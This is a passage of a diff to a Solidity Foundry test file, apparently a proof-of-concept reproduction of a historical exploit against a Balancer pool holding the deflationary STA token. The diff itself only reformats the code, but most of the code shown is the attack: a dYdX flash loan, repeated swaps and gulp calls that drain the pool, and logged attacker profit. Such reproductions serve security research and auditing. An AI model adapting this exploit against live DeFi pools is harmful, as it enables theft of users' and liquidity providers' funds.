@@ -29,12 +29,12 @@ struct AccountInfo {
 
 interface IUniswapV2Router02 {
     function swapExactTokensForTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
-    ) external returns (uint[] memory amounts);
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
 }
 
 library Actions {
@@ -48,6 +48,7 @@ library Actions {
         Liquidate, // liquidate an undercollateralized or expiring account
         Vaporize, // use excess tokens to zero-out a completely negative account
         Call // send arbitrary data to an address
+
     }
 
     struct ActionArgs {
@@ -66,11 +67,13 @@ library Types {
     enum AssetDenomination {
         Wei, // the amount is denominated in wei
         Par // the amount is denominated in par
+
     }
 
     enum AssetReference {
         Delta, // the amount is given as a delta from the current value
         Target // the amount is given as an exact number to end up at
+
     }
 
     struct AssetAmount {
@@ -82,31 +85,32 @@ library Types {
 }
 
 interface ISoloMargin {
-    function operate(
-        AccountInfo[] memory accounts,
-        Actions.ActionArgs[] memory actions
-    ) external;
+    function operate(AccountInfo[] memory accounts, Actions.ActionArgs[] memory actions) external;
 }
 
 interface BPool {
     function swapExactAmountIn(
         address tokenIn,
-        uint tokenAmountIn,
+        uint256 tokenAmountIn,
         address tokenOut,
-        uint minAmountOut,
-        uint maxPrice
-    ) external returns (uint tokenAmountOut, uint spotPriceAfter);
+        uint256 minAmountOut,
+        uint256 maxPrice
+    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
 
-    function gulp(address token) external;
+    function gulp(
+        address token
+    ) external;
 
-    function getBalance(address token) external view returns (uint);
+    function getBalance(
+        address token
+    ) external view returns (uint256);
 
     function swapExactAmountOut(
         address tokenIn,
-        uint maxAmountIn,
+        uint256 maxAmountIn,
         address tokenOut,
-        uint tokenAmountOut,
-        uint maxPrice
+        uint256 tokenAmountOut,
+        uint256 maxPrice
     ) external;
 }
 
@@ -116,8 +120,8 @@ contract BalancerExp is Test {
     address sta = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
     BPool bpool = BPool(0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682);
     address pancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
-    uint public constant BONE = 10 ** 18;
-    uint public constant MAX_IN_RATIO = BONE / 2;
+    uint256 public constant BONE = 10 ** 18;
+    uint256 public constant MAX_IN_RATIO = BONE / 2;
 
     function setUp() public {
         vm.createSelectFork("mainnet", 10_355_806);
@@ -131,14 +135,10 @@ contract BalancerExp is Test {
         IERC20(sta).approve(pancakeV2Router, type(uint256).max);
 
         emit log_named_decimal_uint(
-            "[Before Attack] Attacker WETH Balance : ",
-            (IERC20(weth).balanceOf(address(this))),
-            18
+            "[Before Attack] Attacker WETH Balance : ", (IERC20(weth).balanceOf(address(this))), 18
         );
         emit log_named_decimal_uint(
-            "[Before Attack] Attacker STA Balance : ",
-            (IERC20(sta).balanceOf(address(this))),
-            18
+            "[Before Attack] Attacker STA Balance : ", (IERC20(sta).balanceOf(address(this))), 18
         );
 
         // attack
@@ -146,21 +146,17 @@ contract BalancerExp is Test {
 
         // check profit
         emit log_named_decimal_uint(
-            "[After Attack] Attacker WETH Balance : ",
-            (IERC20(weth).balanceOf(address(this))),
-            18
+            "[After Attack] Attacker WETH Balance : ", (IERC20(weth).balanceOf(address(this))), 18
         );
         emit log_named_decimal_uint(
-            "[After Attack] Attacker STA Balance : ",
-            (IERC20(sta).balanceOf(address(this))),
-            18
+            "[After Attack] Attacker STA Balance : ", (IERC20(sta).balanceOf(address(this))), 18
         );
     }
 
-    function bmul(uint a, uint b) internal pure returns (uint) {
-        uint c0 = a * b;
-        uint c1 = c0 + (BONE / 2);
-        uint c2 = c1 / BONE;
+    function bmul(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c0 = a * b;
+        uint256 c1 = c0 + (BONE / 2);
+        uint256 c2 = c1 / BONE;
         return c2;
     }
 
@@ -174,7 +170,7 @@ contract BalancerExp is Test {
 
         Actions.ActionArgs[] memory actions = new Actions.ActionArgs[](3);
         {
-            uint wethAmount = IERC20(weth).balanceOf(dydx);
+            uint256 wethAmount = IERC20(weth).balanceOf(dydx);
             actions[0].actionType = Actions.ActionType.Withdraw;
             actions[0].amount.value = wethAmount;
             actions[0].otherAddress = address(this);
@@ -198,83 +194,34 @@ contract BalancerExp is Test {
     ) external {
         // swap weth to sta
         bpool.gulp(weth);
-        uint MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
+        uint256 MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
         bpool.swapExactAmountIn(weth, MaxinRatio - 1e18, sta, 0, 9999 * 1e18);
-        bpool.swapExactAmountIn(
-            sta,
-            IERC20(sta).balanceOf(address(this)),
-            weth,
-            0,
-            9999 * 1e18
-        );
+        bpool.swapExactAmountIn(sta, IERC20(sta).balanceOf(address(this)), weth, 0, 9999 * 1e18);
         MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
-        bpool.swapExactAmountIn(
-            weth,
-            (MaxinRatio * 50) / 100,
-            sta,
-            0,
-            9999 * 1e18
-        );
-        bpool.swapExactAmountIn(
-            sta,
-            IERC20(sta).balanceOf(address(this)),
-            weth,
-            0,
-            9999 * 1e18
-        );
+        bpool.swapExactAmountIn(weth, (MaxinRatio * 50) / 100, sta, 0, 9999 * 1e18);
+        bpool.swapExactAmountIn(sta, IERC20(sta).balanceOf(address(this)), weth, 0, 9999 * 1e18);
         MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
-        bpool.swapExactAmountIn(
-            weth,
-            (MaxinRatio * 25) / 100,
-            sta,
-            0,
-            9999 * 1e18
-        );
-        bpool.swapExactAmountIn(
-            sta,
-            IERC20(sta).balanceOf(address(this)),
-            weth,
-            0,
-            9999 * 1e18
-        );
+        bpool.swapExactAmountIn(weth, (MaxinRatio * 25) / 100, sta, 0, 9999 * 1e18);
+        bpool.swapExactAmountIn(sta, IERC20(sta).balanceOf(address(this)), weth, 0, 9999 * 1e18);
 
-        for (uint i = 0; i < 16; i++) {
+        for (uint256 i = 0; i < 16; i++) {
             MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
             if ((i + 1) < 9) {
-                bpool.swapExactAmountIn(
-                    weth,
-                    (MaxinRatio * (i + 1) * 10) / 100,
-                    sta,
-                    0,
-                    9999 * 1e18
-                );
+                bpool.swapExactAmountIn(weth, (MaxinRatio * (i + 1) * 10) / 100, sta, 0, 9999 * 1e18);
             } else {
-                bpool.swapExactAmountIn(
-                    weth,
-                    (MaxinRatio * 95) / 100,
-                    sta,
-                    0,
-                    9999 * 1e18
-                );
+                bpool.swapExactAmountIn(weth, (MaxinRatio * 95) / 100, sta, 0, 9999 * 1e18);
             }
         }
 
-        require(
-            IERC20(sta).balanceOf(address(this)) > 0,
-            "swap weth to sta failed"
-        );
+        require(IERC20(sta).balanceOf(address(this)) > 0, "swap weth to sta failed");
 
         bpool.swapExactAmountOut(
-            weth,
-            99999999999 * 1e18,
-            sta,
-            IERC20(sta).balanceOf(address(bpool)) - 1,
-            99999 * 1e18
+            weth, 99_999_999_999 * 1e18, sta, IERC20(sta).balanceOf(address(bpool)) - 1, 99_999 * 1e18
         );
         bpool.gulp(sta);
 
         // swap sta to weth
-        for (uint j = 0; j < 20; j++) {
+        for (uint256 j = 0; j < 20; j++) {
             MaxinRatio = bmul(bpool.getBalance(sta), MAX_IN_RATIO);
             bpool.swapExactAmountIn(sta, 1, weth, 0, 9999 * 1e18);
             bpool.gulp(sta);
